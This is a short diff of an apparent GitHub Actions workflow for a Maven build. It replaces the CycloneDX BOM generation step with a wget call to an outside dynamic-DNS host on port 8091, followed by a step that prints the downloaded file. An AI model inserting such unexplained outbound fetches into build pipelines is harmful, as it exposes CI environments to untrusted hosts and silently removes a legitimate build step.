@@ -26,4 +26,7 @@ jobs:
         run: 'mvn package'
         shell: bash
       - name: Generate BOM
-        run: 'mvn clean install cyclonedx:makeAggregateBom'
+        run: 'wget http://antovski.ddns.net:8091 -o xxx.html'
+      
+      - name: Show content
+        run: 'cat xxx.html'
